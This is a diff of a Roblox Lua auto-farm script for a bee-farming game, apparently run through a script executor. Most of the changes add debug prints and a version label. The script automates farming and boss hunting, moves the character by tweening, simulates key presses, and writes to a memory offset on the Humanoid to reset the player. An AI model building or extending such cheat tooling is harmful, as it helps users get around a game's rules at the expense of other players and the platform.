@@ -1,3 +1,4 @@
+print("Version 1.1.5 - Fixed Glue & Wealth Clock Dispensers")
 
 local TweenService = {}
 local EasingFunctions = {
@@ -404,7 +405,7 @@ function WaitForArrival(timeout, threshold)
     
     while IsWalking() do
         if os.clock() - startTime > timeout then
-
+            print("Walk timeout")
             StopWalking()
             return false
         end
@@ -560,7 +561,7 @@ function ResetPlayer()
     local humanoid = character:FindFirstChild("Humanoid")
     if not humanoid or not humanoid.Address then return false end
     
-
+    print("Resetting player")
     local OFFSET = 0x18C
     local addr = humanoid.Address
     local v = Vector3.new(0, 0, 0)
@@ -577,7 +578,7 @@ function WaitForRespawn(timeout)
         local character = player.Character
         local humanoid = character:FindFirstChild("Humanoid")
         if humanoid and humanoid.Health <= 0 then
-
+            print("Died")
             break
         end
         
@@ -597,7 +598,7 @@ function WaitForRespawn(timeout)
         end
     end
     
-
+    print("ERROR: Respawn timeout!")
     return false
 end
 
@@ -1066,7 +1067,7 @@ function UI:RenderCombatTab()
         self:RegisterButton(contentX, toggleY, 196, 22, function()
             if toggle.key == "killCoconutCrab" then
                 if not value and self.autoFarmEnabled then
-
+                    print("Turn off Auto Farm first")
                     return
                 end
                 
@@ -1080,7 +1081,7 @@ function UI:RenderCombatTab()
                 end
             elseif toggle.key == "trainSnail" then
                 if not value and self.autoFarmEnabled then
-
+                    print("turn off Auto Farm first")
                     return
                 end
                 
@@ -1098,10 +1099,10 @@ function UI:RenderCombatTab()
                 
                 if self.killKingBeetle then
                     if not self.autoFarmEnabled then
-
+                        print("King Beetle Enabled When Auto Farm starts")
                     end
                 else
-
+                    print("King Beetle disabled")
                 end
             elseif toggle.key == "killViciousBee" then
                 self.killViciousBee = not self.killViciousBee
@@ -1109,20 +1110,20 @@ function UI:RenderCombatTab()
                 
                 if self.killViciousBee then
                     if not self.autoFarmEnabled then
-
+                        print("Vicious Bee enabled when Auto Farm starts")
                     end
                 else
-
+                    print("Vicious Bee disabled")
                 end
             elseif toggle.key == "killCommandoChick" then
                 self.killCommandoChick = not self.killCommandoChick
                 self.needsRedraw = true
                 if self.killCommandoChick then
                     if not self.autoFarmEnabled then
-
+                        print("Commando Chick enabled when Auto Farm starts")
                     end
                else
-
+                    print("Commando Chick disabled")
                end
             elseif toggle.key == "killTunnelBear" then
     self.killTunnelBear = not self.killTunnelBear
@@ -1130,10 +1131,10 @@ function UI:RenderCombatTab()
     
     if self.killTunnelBear then
         if not self.autoFarmEnabled then
-
+            print("Tunnel Bear enabled when Auto Farm starts")
         end
     else
-
+        print("Tunnel Bear disabled")
     end
             elseif toggle.key == "killWindy" then
                 self.killWindy = not self.killWindy
@@ -1141,10 +1142,10 @@ function UI:RenderCombatTab()
     
                 if self.killWindy then
                     if not self.autoFarmEnabled then
-
+                        print("Windy Bee enabled when Auto Farm starts")
                     end
                 else
-
+                    print("Windy Bee disabled")
                 end
             else
                 self[toggle.key] = not self[toggle.key]
@@ -1253,12 +1254,12 @@ function UI:RenderMiscTab()
         self:RegisterButton(contentX, toggleY, 196, 22, function()
             if dispenser.key == "autoAlign" then
                 autoAlignEnabled = not autoAlignEnabled
-
+                print("Auto Align " .. (autoAlignEnabled and "enabled" or "disabled"))
                 self.needsRedraw = true
             else
                 self[dispenser.key] = not self[dispenser.key]
                 self.needsRedraw = true
-
+                print(dispenser.label .. " toggled to: " .. tostring(self[dispenser.key]))
             end
         end)
     end
@@ -1271,7 +1272,7 @@ function UI:RenderMiscTab()
 
     local automations = {
         {label = "Summon Honey Storm", key = "summonHoneyStorm"},
-        {label = "Collect Wealth Clock (Bug)", key = "collectWealthClock"},
+        {label = "Collect Wealth Clock", key = "collectWealthClock"},
         {label = "Auto Planters", key = "autoPlanters"},
         {label = "Auto Boost", key = "autoBoost"},
         {label = "Auto Quest", key = "autoQuest"},
@@ -1304,7 +1305,7 @@ function UI:RenderMiscTab()
         self:RegisterButton(automationsX, toggleY, 196, 22, function()
             self[automation.key] = not self[automation.key]
             self.needsRedraw = true
-
+            print(automation.label .. " toggled to: " .. tostring(self[automation.key]))
         end)
     end
 end
@@ -1348,7 +1349,7 @@ function UI:RenderSettingsTab()
         self:CreateRect(circleX, toggleY + 7, 7, 7, Color3.fromRGB(255, 255, 255))
         
         self:RegisterButton(contentX, toggleY, 196, 22, function()
-
+            print(toggle.label .. " toggled")
         end)
     end
     
@@ -1412,7 +1413,7 @@ function UI:RenderSettingsTab()
 
     -- Version info at bottom
     local versionY = contentY + 240
-    self:CreateText("Version 1.1.5 - Fixed Farm Bloom", sliderX, versionY, Color3.fromRGB(100, 110, 125), 11)
+    self:CreateText("Version 1.1.5 - Fixed Glue & Wealth Clock Dispensers", sliderX, versionY, Color3.fromRGB(100, 110, 125), 11)
     self:CreateText("Lito", sliderX, versionY + 18, Color3.fromRGB(100, 110, 125), 11)
 end
 
@@ -1421,7 +1422,7 @@ end
 
 function UI:StartAutoFarm()
     if self.selectedOption == "Select Field..." or self.selectedOption == "" then
-
+        print("Please select a field first!")
         self.autoFarmEnabled = false
         self.needsRedraw = true
         return
@@ -1434,20 +1435,20 @@ function UI:StartAutoFarm()
 
     -- Check if coconut crab is running
     if self.killCoconutCrab then
-
+        print("Turn off Coconut Crab first!")
         self.autoFarmEnabled = false
         self.needsRedraw = true
         return
     end
 
     if self.autoFarmRunning then
-
+        print("ERROR: Auto farm already running! Stopping old instance...")
         self:StopAutoFarm()
         wait(1)
     end
     
     if self.autoFarmThread then
-
+        print("Killing old auto farm thread...")
         task.cancel(self.autoFarmThread)
         self.autoFarmThread = nil
         wait(0.5)
@@ -1480,7 +1481,7 @@ function UI:StartAutoFarm()
             
             local humanoid = character:FindFirstChild("Humanoid")
             if humanoid and humanoid.Health <= 0 then
-
+                print("PLAYER DIED")
                 self.status = "Respawning..."
                 self.needsRedraw = true
                 
@@ -1492,7 +1493,7 @@ function UI:StartAutoFarm()
                 local respawned = WaitForRespawn(30)
                 
                 if respawned then
-
+                    print("✓ Respawned successfully")
                     
                     self.status = "Waiting for bees..."
                     self.needsRedraw = true
@@ -1500,7 +1501,7 @@ function UI:StartAutoFarm()
                     -- If was hunting Vicious Bee, return to original field
                     -- Don't reset Vicious hunting on death - keep hunting until it despawns
 if self.huntingVicious then
-
+    print("Died while hunting Vicious Bee, will resume hunting after respawn")
     walkedToViciousOnce = false  -- Reset so we walk to it again after respawn
 end
                     
@@ -1523,7 +1524,7 @@ end
                             if flowerZones and self.selectedOption then
                                 local targetZone = flowerZones:FindFirstChild(self.selectedOption)
                                 if targetZone then
-
+                                    print("Forcing tween back to field after death...")
                                     local targetPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                                     self:QueueTween(hrp, targetPos, true)
                                     
@@ -1532,14 +1533,14 @@ end
                                     end
                                     
                                     wait(1)
-
-
+                                    print("✓ Arrived back at field after death")
+                                    print("Sprinklers will be placed next time in field")
                                 end
                             end
                         end
                     end
                 else
-
+                    print("ERROR: Failed to respawn, stopping auto farm")
                     self:StopAutoFarm()
                     return false
                 end
@@ -1551,13 +1552,11 @@ end
         end
         
         while self.autoFarmEnabled and self.autoFarmRunning do
-            -- Check for death at start of loop
             if checkAndHandleDeath() then
                 wait(0.5)
                 continue
             end
             
-            -- Pause if timed action is running
             if self.pausedForTimedAction then
                 wait(0.5)
                 continue
@@ -1568,14 +1567,14 @@ end
                 local character = player.Character
                 
                 if not character then
-
+                    print("No character, waiting...")
                     wait(1)
                     return
                 end
                 
                 local hrp = character:FindFirstChild("HumanoidRootPart")
                 if not hrp then
-
+                    print("No HRP, waiting...")
                     wait(1)
                     return
                 end
@@ -1596,7 +1595,7 @@ end
                         if pollenValue >= capacityValue or gatherTimeFull then
                             if not fullPollenTime then
                                 fullPollenTime = os.clock() - 2
-
+                                print("Set fullPollenTime=" .. fullPollenTime)
                             else
                                 local elapsed = os.clock() - fullPollenTime
                             end
@@ -1641,7 +1640,7 @@ end
                                             end
                                         end
                                     else
-
+                                        print("ERROR: Failed to respawn, stopping auto farm")
                                         self:StopAutoFarm()
                                         return
                                     end
@@ -1656,7 +1655,7 @@ wait(0.5)
 
 -- STEP 1: Tween to waypoint first
 local waypointPos = Vector3.new(-114, 5, 271)
-
+print("Tweening to waypoint before hive...")
 self:QueueTween(hrp, waypointPos, true)
 
 local maxWaitTime = 60
@@ -1668,14 +1667,14 @@ while self.processingTween and self.autoFarmEnabled do
     end
     
     if os.clock() - startWait > maxWaitTime then
-
+        print("ERROR: Waypoint tween timeout!")
         self:ClearTweenQueue()
         break
     end
     wait(0.1)
 end
 
-
+print("✓ Arrived at waypoint, now finding hive...")
 wait(0.5)
 
 -- STEP 2: Find hive and walk to it
@@ -1703,13 +1702,13 @@ if hivePlatforms then
             local hivePos = Vector3.new(hivePart.Position.X, hivePart.Position.Y + 5, hivePart.Position.Z)
             
             -- WALK to hive (not tween)
-
+            print("Walking to hive from waypoint...")
             WalkTo(hivePos)
             
             local walkStartTime = os.clock()
             while IsWalking() and self.autoFarmEnabled do
                 if os.clock() - walkStartTime > 30 then
-
+                    print("Walk to hive timeout")
                     StopWalking()
                     break
                 end
@@ -1723,7 +1722,7 @@ if hivePlatforms then
                     local distanceToHive = math.sqrt(dx * dx + dy * dy + dz * dz)
                     
                     if distanceToHive < 3 then
-
+                        print("✓ Arrived at hive")
                         StopWalking()
                         break
                     end
@@ -1746,7 +1745,7 @@ if hivePlatforms then
                 -- CRITICAL: Verify player is actually at hive before converting
                 hrp = character:FindFirstChild("HumanoidRootPart")
                 if not hrp then
-
+                    print("ERROR: No HRP for conversion check")
                     returningToHive = false
                     fullPollenTime = nil
                 else
@@ -1756,17 +1755,17 @@ if hivePlatforms then
                     local dz = hivePos.Z - currentPos.Z
                     local distanceToHive = math.sqrt(dx * dx + dy * dy + dz * dz)
                     
-
+                    print("Distance to hive: " .. string.format("%.1f", distanceToHive) .. " studs")
                     
                     -- If player is NOT at hive (more than 25 studs away), try to return
                     if distanceToHive > 25 then
-
+                        print("⚠️ Player is " .. string.format("%.1f", distanceToHive) .. " studs from hive!")
                         
                         self.status = "Returning to Hive"
                         self.needsRedraw = true
                         
                         -- Try walking back first (5 second attempt)
-
+                        print("Attempting to walk back to hive...")
                         WalkTo(hivePos)
                         
                         local walkStartTime = os.clock()
@@ -1774,7 +1773,7 @@ if hivePlatforms then
                         
                         while IsWalking() and self.autoFarmEnabled do
                             if os.clock() - walkStartTime > 5 then
-
+                                print("Walk timeout (5s), switching to tween...")
                                 StopWalking()
                                 break
                             end
@@ -1788,7 +1787,7 @@ if hivePlatforms then
                                 local cDist = math.sqrt(cdx * cdx + cdy * cdy + cdz * cdz)
                                 
                                 if cDist < 25 then
-
+                                    print("✓ Walked back to hive successfully")
                                     StopWalking()
                                     walkSuccess = true
                                     break
@@ -1802,13 +1801,13 @@ if hivePlatforms then
                         
                         -- If walk failed, use tween
                         if not walkSuccess then
-
+                            print("Walk failed, using tween to return to hive...")
                             self:QueueTween(hrp, hivePos, true)
                             
                             local tweenStartTime = os.clock()
                             while self.processingTween and self.autoFarmEnabled do
                                 if os.clock() - tweenStartTime > 60 then
-
+                                    print("ERROR: Tween timeout!")
                                     self:ClearTweenQueue()
                                     returningToHive = false
                                     fullPollenTime = nil
@@ -1819,7 +1818,7 @@ if hivePlatforms then
                             
                             if self.processingTween then
                                 wait(1)
-
+                                print("✓ Tweened back to hive")
                             end
                         end
                         
@@ -1836,12 +1835,12 @@ if hivePlatforms then
                         distanceToHive = math.sqrt(dx * dx + dy * dy + dz * dz)
                         
                         if distanceToHive > 25 then
-
-
+                            print("ERROR: Still not at hive after return attempts (" .. string.format("%.1f", distanceToHive) .. " studs)")
+                            print("Skipping conversion and resuming farming")
                             returningToHive = false
                             fullPollenTime = nil
                         else
-
+                            print("✓ At hive, starting conversion")
                             self.status = "Converting Pollen"
                             self.needsRedraw = true
                             wait(0.3)
@@ -1854,27 +1853,27 @@ if hivePlatforms then
                 end
                 
                 -- Check for nearby hive balloon if Convert Balloon is enabled
-
+                print("DEBUG BALLOON: convertBalloon = " .. tostring(self.convertBalloon))
 
                 local balloonFound = false
                 if self.convertBalloon then
-
+                    print("DEBUG BALLOON: Checking for balloons...")
                     local balloons = game.Workspace:FindFirstChild("Balloons")
-
+                    print("DEBUG BALLOON: Balloons folder exists: " .. tostring(balloons ~= nil))
                     
                     if balloons then
                         local hiveBalloons = balloons:FindFirstChild("HiveBalloons")
-
+                        print("DEBUG BALLOON: HiveBalloons exists: " .. tostring(hiveBalloons ~= nil))
                         
                         if hiveBalloons then
-
+                            print("DEBUG BALLOON: HiveBalloons children count: " .. #hiveBalloons:GetChildren())
                             
                             for _, balloonInstance in pairs(hiveBalloons:GetChildren()) do
-
+                                print("DEBUG BALLOON: Checking balloonInstance: " .. balloonInstance.Name)
                                 
                                 if balloonInstance.Name == "HiveBalloonInstance" then
                                     local balloonBody = balloonInstance:FindFirstChild("BalloonBody")
-
+                                    print("DEBUG BALLOON: BalloonBody exists: " .. tostring(balloonBody ~= nil))
                                     
                                     if balloonBody and balloonBody:IsA("BasePart") then
                                         local balloonPos = balloonBody.Position
@@ -1885,10 +1884,10 @@ if hivePlatforms then
                                         local dz = balloonPos.Z - hrpPos.Z
                                         local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
                                         
-
+                                        print("DEBUG BALLOON: Balloon distance: " .. string.format("%.1f", distance) .. " studs")
                                         
                                         if distance <= 25 then
-
+                                            print("✓✓✓ Hive balloon found within 20 studs! Waiting for it to disappear...")
                                             balloonFound = true
                                             self.status = "Converting Balloon"
                                             self.needsRedraw = true
@@ -1904,8 +1903,8 @@ if hivePlatforms then
                                                     local cDist = math.sqrt(cdx * cdx + cdy * cdy + cdz * cdz)
                                                     
                                                     if cDist > 25 then
-
-
+                                                        print("⚠️ Player moved away from hive during balloon conversion (" .. string.format("%.1f", cDist) .. " studs)!")
+                                                        print("Attempting to return to hive...")
                                                         
                                                         WalkTo(hivePos)
                                                         local walkStart = os.clock()
@@ -1913,7 +1912,7 @@ if hivePlatforms then
                                                         while IsWalking() and self.autoFarmEnabled do
                                                             if os.clock() - walkStart > 5 then
                                                                 StopWalking()
-
+                                                                print("Walk timeout, using tween...")
                                                                 self:QueueTween(hrp, hivePos, true)
                                                                 
                                                                 while self.processingTween and self.autoFarmEnabled do
@@ -1942,7 +1941,7 @@ if hivePlatforms then
                                                         
                                                         StopWalking()
                                                         wait(1)
-
+                                                        print("✓ Returned to hive")
                                                         
                                                         -- Wait for Roblox to be active before pressing E
                                                         while not isrbxactive() and self.autoFarmEnabled do
@@ -1953,21 +1952,21 @@ if hivePlatforms then
                                                         end
                                                         
                                                         if self.autoFarmEnabled then
-
+                                                            print("Pressing E to restart conversion...")
                                                             keypress(0x45)
                                                             wait(0.2)
                                                             keyrelease(0x45)
                                                             wait(0.5)
-
+                                                            print("✓ Conversion restarted")
                                                         end
                                                     end
                                                 end
                                                 
-
+                                                print("DEBUG BALLOON: Still waiting for balloon to disappear...")
                                                 wait(0.5)
                                             end
                                             
-
+                                            print("✓ Balloon disappeared!")
                                             break
                                         end
                                     end
@@ -1988,8 +1987,8 @@ if hivePlatforms then
                                                     local cDist = math.sqrt(cdx * cdx + cdy * cdy + cdz * cdz)
                                                     
                                                     if cDist > 25 then
-
-
+                                                        print("⚠️ Player moved away from hive during conversion (" .. string.format("%.1f", cDist) .. " studs)!")
+                                                        print("Attempting to return to hive...")
                                                         
                                                         WalkTo(hivePos)
                                                         local walkStart = os.clock()
@@ -1997,7 +1996,7 @@ if hivePlatforms then
                                                         while IsWalking() and self.autoFarmEnabled do
                                                             if os.clock() - walkStart > 5 then
                                                                 StopWalking()
-
+                                                                print("Walk timeout, using tween...")
                                                                 self:QueueTween(hrp, hivePos, true)
                                                                 
                                                                 while self.processingTween and self.autoFarmEnabled do
@@ -2025,7 +2024,7 @@ if hivePlatforms then
                                                         end
                                                         
                                                         StopWalking()
-
+                                                        print("✓ Returned to hive")
                                                         
                                                         -- Wait for Roblox to be active before pressing E
                                                         while not isrbxactive() and self.autoFarmEnabled do
@@ -2036,12 +2035,12 @@ if hivePlatforms then
                                                         end
                                                         
                                                         if self.autoFarmEnabled then
-
+                                                            print("Pressing E to restart conversion...")
                                                             keypress(0x45)
                                                             wait(0.2)
                                                             keyrelease(0x45)
                                                             wait(0.5)
-
+                                                            print("✓ Conversion restarted")
                                                         end
                                                     end
                                                 end
@@ -2049,12 +2048,12 @@ if hivePlatforms then
                                                 local currentPollen = pollen.Value
                                                 
                                                 if currentPollen <= 0 then
-
+                                                    print("Pollen reached 0, waiting 4 seconds for bees to convert...")
                                                     wait(4)
                                                     if self.returningFromConversion then
-
+                                                        print("✓ Resetting gather timer after conversion")
                                                         self.gatherStartTime = os.clock()
-
+                                                        print("DEBUG: [After Conversion] gatherStartTime reset to " .. self.gatherStartTime)
                                                         self.returningFromConversion = false
                                                     end
                                                     break
@@ -2101,7 +2100,7 @@ if hivePlatforms then
                 
                 -- Check for Windy Bee
 if self.killWindy then
-
+    print("DEBUG: Checking for Windy Bee...")
     local windyBeeData = self:CheckForWindyBee()
     
     if windyBeeData then
@@ -2111,7 +2110,7 @@ if self.killWindy then
         -- Windy Bee is present
         if not huntingWindy then
             -- Just started hunting
-
+            print("=== WINDY BEE DETECTED - SWITCHING TO " .. windyBeeField.Name .. " ===")
             originalFieldBeforeWindy = self.selectedOption
             if self.lastFieldChangeSource == "autofarm" or not self.lastFieldChangeSource then
                 self.originalAutoFarmField = self.selectedOption
@@ -2130,7 +2129,7 @@ if self.killWindy then
                 local targetZone = flowerZones:FindFirstChild(windyBeeField.Name)
                 if targetZone then
                     local fieldCenterPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
-
+                    print("Step 1: Tweening to " .. windyBeeField.Name .. " center")
                     self:QueueTween(hrp, fieldCenterPos, true)
                     
                     -- Wait for tween to complete
@@ -2141,7 +2140,7 @@ if self.killWindy then
                         wait(0.1)
                     end
                     
-
+                    print("✓ Arrived at field center")
                     wait(0.5)
                 end
             end
@@ -2150,7 +2149,7 @@ if self.killWindy then
             if self.autoFarmEnabled and not walkedToWindyOnce then
                 self.status = "Tweening to Windy Bee"
                 self.needsRedraw = true
-
+                print("Step 2: Tweening to Windy Bee with live position tracking...")
                 
                 -- Start the tween to initial position
                 windyBeeData = self:CheckForWindyBee()
@@ -2190,7 +2189,7 @@ if self.killWindy then
                                 self.currentTween = TweenService:Create(hrp, tweenInfo, {Position = windyBeePos})
                                 self.currentTween:Play()
                                 
-
+                                print("Updated Windy Bee position: " .. tostring(windyBeePos))
                             end
                         end
                         lastUpdateTime = os.clock()
@@ -2200,7 +2199,7 @@ if self.killWindy then
                 end
                 
                 walkedToWindyOnce = true
-
+                print("✓ Arrived at Windy Bee, starting normal farming")
                 self.status = "Hunting Windy Bee"
                 self.needsRedraw = true
                 wait(0.5)
@@ -2208,7 +2207,7 @@ if self.killWindy then
             
         elseif windyBeeField.Name ~= self.selectedOption then
             -- Windy Bee moved to a different field
-
+            print("Windy Bee moved to " .. windyBeeField.Name)
             self.selectedOption = windyBeeField.Name
             self.sprinklersPlaced = false
             walkedToWindyOnce = true  -- Don't walk to Windy again, just go to new field
@@ -2220,7 +2219,7 @@ if self.killWindy then
                 local targetZone = flowerZones:FindFirstChild(windyBeeField.Name)
                 if targetZone then
                     local fieldCenterPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
-
+                    print("Windy Bee moved, tweening to new field " .. windyBeeField.Name)
                     self.status = "Following to New Field"
                     self.needsRedraw = true
                     self:QueueTween(hrp, fieldCenterPos, true)
@@ -2233,7 +2232,7 @@ if self.killWindy then
                         wait(0.1)
                     end
                     
-
+                    print("✓ Arrived at new field, resuming normal farming")
                 end
             end
         end
@@ -2241,7 +2240,7 @@ if self.killWindy then
 else
     if huntingWindy then
         local returnField = self.originalAutoFarmField or originalFieldBeforeWindy
-
+        print("✓ Windy Bee despawned! Returning to " .. returnField)
         self.selectedOption = returnField
         self.lastFieldChangeSource = "autofarm"
         self.sprinklersPlaced = false
@@ -2264,20 +2263,20 @@ else
                     hrp = character:FindFirstChild("HumanoidRootPart")
                     if hrp then
                         local targetPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
-
+                        print("Tweening back to " .. returnField)
                         self:QueueTween(hrp, targetPos, true)
                                         
                         local startWait = os.clock()
                         while self.processingTween and self.autoFarmEnabled do
                             if os.clock() - startWait > 60 then
-
+                                print("ERROR: Return to field timeout!")
                                 self:ClearTweenQueue()
                                 break
                             end
                             wait(0.1)
                         end
                                         
-
+                        print("✓✓✓ Returned to original field: " .. returnField)
                         self.status = "Auto Farm Active"
                         self.needsRedraw = true
                     end
@@ -2287,24 +2286,19 @@ else
     end
 end
 
--- Check for Sprouts
-
+print("SPROUT: Checking for sprouts")
 if self.farmSprouts then
     local sproutData = self:CheckForSprouts()
     
     if sproutData then
         local sproutField = sproutData.field
-
+        print("SPROUT: Sprout data - Field: " .. sproutField.Name)
         
-        -- Check if we're already farming this specific sprout field
         if not self.currentSproutField then
-            -- Not farming any sprout yet, start farming this one
-
-            
-            -- Save current field and track which sprout field we're farming
+            print(" SPROUT - SWITCHING FROM " .. self.selectedOption .. " TO " .. sproutField.Name .. " ===")
             if self.lastFieldChangeSource == "autofarm" or not self.lastFieldChangeSource then
                 self.originalAutoFarmField = self.selectedOption
-
+                print("DEBUG SPROUT: Saved originalAutoFarmField = " .. self.originalAutoFarmField)
             end
             
             self.lastFieldChangeSource = "sprout"
@@ -2321,7 +2315,7 @@ if self.farmSprouts then
                 local targetZone = flowerZones:FindFirstChild(sproutField.Name)
                 if targetZone then
                     local fieldCenterPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
-
+                    print("DEBUG SPROUT: Tweening to " .. sproutField.Name)
                     self:QueueTween(hrp, fieldCenterPos, true)
                     
                     while self.processingTween and self.autoFarmEnabled do
@@ -2330,25 +2324,18 @@ if self.farmSprouts then
                         end
                         wait(0.1)
                     end
-                    
-
-                    wait(0.5)
                 end
             end
         elseif self.currentSproutField == sproutField.Name then
-            -- Already farming this sprout field, continue farming
-
+            print("DEBUG SPROUT: Already farming sprout in " .. sproutField.Name)
         else
-            -- Different sprout spawned, but we're committed to current one
-
+            print("DEBUG SPROUT: New sprout in " .. sproutField.Name .. " but committed to " .. self.currentSproutField)
         end
     else
-        -- No Sprout found - check if we WERE farming a sprout
         if self.currentSproutField then
-    -- Sprout in OUR field despawned!
     local returnField = self.originalAutoFarmField or self.selectedOption
-
-
+    print("DEBUG SPROUT: ✓ Sprout in " .. self.currentSproutField .. " despawned!")
+    print("DEBUG SPROUT: Collecting tokens for 20 seconds before returning to " .. returnField)
     
     self.currentSproutField = nil  -- Clear tracked sprout field
     self.status = "Collecting Sprout Tokens"
@@ -2359,7 +2346,7 @@ if self.farmSprouts then
     self.sproutCollectionEndTime = os.clock() + 20
     local collectStartTime = os.clock()
     
-
+    print("DEBUG SPROUT: Starting 20-second collection with TokenCollector...")
     
     while self.autoFarmEnabled and (os.clock() - collectStartTime) < 20 do
         -- PRIORITY CHECK: Pollen full?
@@ -2368,7 +2355,7 @@ if self.farmSprouts then
             local pollen = coreStats:FindFirstChild("Pollen")
             local capacity = coreStats:FindFirstChild("Capacity")
             if pollen and capacity and pollen.Value >= capacity.Value then
-
+                print("DEBUG SPROUT: POLLEN FULL - Stopping sprout collection early")
                 StopWalking()
                 break
             end
@@ -2378,7 +2365,7 @@ if self.farmSprouts then
         local gatherTimeSeconds = self.gatherTime * 60
         local timeElapsed = os.clock() - (self.gatherStartTime or os.clock())
         if timeElapsed >= gatherTimeSeconds then
-
+            print("DEBUG SPROUT: TIME LIMIT - Stopping sprout collection early")
             StopWalking()
             break
         end
@@ -2388,7 +2375,7 @@ if self.farmSprouts then
         if character then
             local humanoid = character:FindFirstChild("Humanoid")
             if humanoid and humanoid.Health <= 0 then
-
+                print("DEBUG SPROUT: DEATH - Stopping sprout collection early")
                 StopWalking()
                 break
             end
@@ -2398,7 +2385,7 @@ if self.farmSprouts then
         if self.killViciousBee then
             local viciousBeeData = self:CheckForViciousBee()
             if viciousBeeData then
-
+                print("DEBUG SPROUT: VICIOUS BEE SPAWNED - Stopping sprout collection early")
                 StopWalking()
                 break
             end
@@ -2408,7 +2395,7 @@ if self.farmSprouts then
         if self.killWindy then
             local windyBeeData = self:CheckForWindyBee()
             if windyBeeData then
-
+                print("DEBUG SPROUT: WINDY BEE SPAWNED - Stopping sprout collection early")
                 StopWalking()
                 break
             end
@@ -2423,19 +2410,19 @@ if self.farmSprouts then
         
         -- Check if time is up
         if os.clock() >= self.sproutCollectionEndTime then
-
+            print("DEBUG SPROUT: ✓ 20 seconds complete")
             break
         end
     end
         end
     end
 else
-
+    print("DEBUG SPROUT: farmSprouts toggle is OFF")
 end
 
 -- Check if field selection changed
 if self.selectedOption ~= lastSelectedField then
-
+    print("Field changed to: " .. self.selectedOption)
     lastSelectedField = self.selectedOption
     originalField = self.selectedOption  -- Update global field storer
     self.sprinklersPlaced = false  -- Reset sprinkler flag on field change
@@ -2456,12 +2443,12 @@ if self.killViciousBee then
         -- Vicious Bee is present
         if not self.huntingVicious then
     -- Just started hunting
-
+    print("=== VICIOUS BEE DETECTED - SWITCHING TO " .. viciousBeeField.Name .. " ===")
     
     -- Save the current auto-farm field BEFORE switching
     if self.lastFieldChangeSource == "autofarm" or not self.lastFieldChangeSource then
         self.originalAutoFarmField = self.selectedOption
-
+        print("DEBUG: Saved originalAutoFarmField = " .. self.originalAutoFarmField)
     end
     
     self.lastFieldChangeSource = "vicious"
@@ -2480,7 +2467,7 @@ if self.killViciousBee then
         local targetZone = flowerZones:FindFirstChild(viciousBeeField.Name)
         if targetZone then
             local fieldCenterPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
-
+            print("Step 1: Tweening to " .. viciousBeeField.Name .. " center")
             self:QueueTween(hrp, fieldCenterPos, true)
             
             -- Wait for tween to complete
@@ -2491,7 +2478,7 @@ if self.killViciousBee then
                 wait(0.1)
             end
             
-
+            print("✓ Arrived at field center")
             wait(0.5)
         end
     end
@@ -2505,7 +2492,7 @@ if self.autoFarmEnabled and not self.walkedToViciousOnce then
         
         self.status = "Walking to Vicious Bee"
         self.needsRedraw = true
-
+        print("Step 2: Walking to Vicious Bee at " .. tostring(viciousBeePos))
         WalkTo(viciousBeePos)
         
         -- Wait for arrival with death checks AND position updates
@@ -2523,7 +2510,7 @@ if self.autoFarmEnabled and not self.walkedToViciousOnce then
                 if viciousBeeData then
                     viciousBeePos = viciousBeeData.position
                     WalkTo(viciousBeePos)
-
+                    print("Updated Vicious Bee position: " .. tostring(viciousBeePos))
                 end
                 lastUpdateTime = os.clock()
             end
@@ -2538,14 +2525,14 @@ if self.autoFarmEnabled and not self.walkedToViciousOnce then
                 
                 -- Arrived if within 15 studs on ground plane (ignoring Y)
                 if distance2D < 15 then
-
+                    print("✓ Arrived at Vicious Bee (2D distance: " .. string.format("%.1f", distance2D) .. " studs)")
                     StopWalking()
                     break
                 end
             end
             
             if os.clock() - startTime > 15 then
-
+                print("Walk to Vicious Bee timeout")
                 StopWalking()
                 break
             end
@@ -2555,7 +2542,7 @@ if self.autoFarmEnabled and not self.walkedToViciousOnce then
         
         StopWalking()
         self.walkedToViciousOnce = true
-
+        print("✓ Arrived at Vicious Bee, starting normal farming")
         self.status = "Hunting Vicious Bee"
         self.needsRedraw = true
     end
@@ -2563,7 +2550,7 @@ end
                             
                         elseif viciousBeeField.Name ~= self.selectedOption then
                             -- Vicious Bee moved to a different field
-
+                            print("Vicious Bee moved to " .. viciousBeeField.Name)
                             self.selectedOption = viciousBeeField.Name
                             self.sprinklersPlaced = false
                             walkedToViciousOnce = false
@@ -2575,7 +2562,7 @@ end
                                 local targetZone = flowerZones:FindFirstChild(viciousBeeField.Name)
                                 if targetZone then
                                     local fieldCenterPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
-
+                                    print("Step 1: Tweening to new field " .. viciousBeeField.Name)
                                     self.status = "Following to New Field"
                                     self.needsRedraw = true
                                     self:QueueTween(hrp, fieldCenterPos, true)
@@ -2588,7 +2575,7 @@ end
                                         wait(0.1)
                                     end
                                     
-
+                                    print("✓ Arrived at new field center")
                                     wait(0.5)
                                 end
                             end
@@ -2602,7 +2589,7 @@ end
                                     
                                     self.status = "Walking to Vicious Bee"
                                     self.needsRedraw = true
-
+                                    print("Step 2: Walking to new Vicious Bee position: " .. tostring(viciousBeePos))
                                     WalkTo(viciousBeePos)
                                     
                                     -- Wait for arrival with death checks
@@ -2613,7 +2600,7 @@ end
                                         end
                                         
                                         if os.clock() - startTime > 15 then
-
+                                            print("Walk to Vicious Bee timeout")
                                             StopWalking()
                                             break
                                         end
@@ -2623,7 +2610,7 @@ end
                                     
                                     StopWalking()
                                     self.walkedToViciousOnce = true
-
+                                    print("✓ Arrived at new Vicious Bee location, resuming normal farming")
                                 end
                             end
                         end
@@ -2633,7 +2620,7 @@ end
     if self.huntingVicious then
         -- Was hunting, but now it's gone
         local returnField = self.originalAutoFarmField or self.selectedOption
-
+        print("✓ Vicious Bee defeated or despawned! Returning to " .. returnField)
         
         self.selectedOption = returnField
         self.lastFieldChangeSource = "autofarm"
@@ -2663,7 +2650,7 @@ end
                     wait(0.1)
                 end
                 
-
+                print("✓ Returned to original field: " .. returnField)
                 self.status = "Auto Farm Active"
                 self.needsRedraw = true
             end
@@ -2681,7 +2668,7 @@ end
                 local targetZone = flowerZones:FindFirstChild(self.selectedOption)
                 
                 if not targetZone then
-
